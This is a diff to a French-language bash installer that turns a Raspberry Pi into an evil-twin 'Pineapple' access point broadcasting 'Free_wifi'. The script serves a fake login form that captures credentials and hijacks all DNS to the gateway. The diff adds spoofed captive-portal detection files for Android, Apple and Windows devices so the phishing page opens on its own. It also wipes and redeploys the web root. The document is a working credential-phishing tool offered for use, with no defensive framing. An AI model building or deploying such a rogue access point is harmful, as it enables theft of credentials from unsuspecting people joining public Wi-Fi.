@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# 🔧 Variables
+# Variables
 DIR="/home/pi/pineapple"
 WWW="$DIR/www"
 CAPTURE="$DIR/captures"
@@ -14,15 +14,12 @@ sudo apt install -y hostapd dnsmasq lighttpd php
 echo "[*] Création de l'arborescence..."
 mkdir -p "$WWW" "$CAPTURE"
 
-echo "[*] Configuration du système pour éviter les conflits DHCP..."
-
-# Empêche dhcpcd de gérer wlan1
+echo "[*] Configuration réseau : désactivation des services conflictuels..."
 if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
     echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
     sudo systemctl restart dhcpcd
 fi
 
-# Désactive dnsmasq système (évite conflit sur port 67)
 sudo systemctl stop dnsmasq 2>/dev/null
 sudo systemctl disable dnsmasq 2>/dev/null
 
@@ -41,8 +38,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <html>
 <head>
     <title>Free Wi-Fi</title>
+    <meta charset="UTF-8">
 </head>
 <body>
+    <script>
+        if (document.referrer === "") {
+            window.location.href = "/index.php";
+        }
+    </script>
     <h2>Connexion Free_wifi</h2>
     <form method="POST">
         Login : <input type="text" name="login" /><br />
@@ -52,6 +55,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 </body>
 </html>
 EOF
+
+echo "[*] Ajout des fichiers de détection de portail captif..."
+echo "<html><meta http-equiv='refresh' content='0; url=/index.php'></html>" > "$WWW/generate_204"
+cp "$WWW/generate_204" "$WWW/hotspot-detect.html"
+cp "$WWW/generate_204" "$WWW/ncsi.txt"  # Windows captive portal
 
 echo "[*] Génération de hostapd.conf..."
 cat > "$DIR/hostapd.conf" <<EOF
@@ -72,7 +80,7 @@ dhcp-range=10.0.0.10,10.0.0.50,12h
 address=/#/10.0.0.1
 EOF
 
-echo "[*] Création du menu interactif Pineapple..."
+echo "[*] Création du menu interactif..."
 cat > "$DIR/pineapple_menu.sh" << 'EOF'
 #!/bin/bash
 
@@ -88,15 +96,21 @@ start_pineapple() {
     sudo ip addr flush dev "$WLAN_FAKEAP"
     sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
     sudo ip link set "$WLAN_FAKEAP" up
+
     sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
     sudo iptables -F
     sudo iptables -t nat -F
     sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
     sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+
+    echo "[*] Déploiement des fichiers web..."
+    sudo rm -rf /var/www/html/*
+    sudo cp -r "$DIR/www/"* /var/www/html/
+    sudo systemctl restart lighttpd
+
     sudo dnsmasq -C "$DIR/dnsmasq.conf"
     sudo hostapd "$DIR/hostapd.conf" &
-    sudo cp -r "$DIR/www" /var/www/html/
-    sudo systemctl restart lighttpd
+
     echo "[✔] Pineapple lancé. SSID : Free_wifi"
     read -p "Appuie sur Entrée pour revenir au menu..."
 }
@@ -161,5 +175,5 @@ EOF
 
 chmod +x "$DIR/pineapple_menu.sh"
 
-echo "[✔] Installation terminée !"
+echo "[✔] Installation terminée."
 echo "➡️ Lance le menu avec : bash $DIR/pineapple_menu.sh"
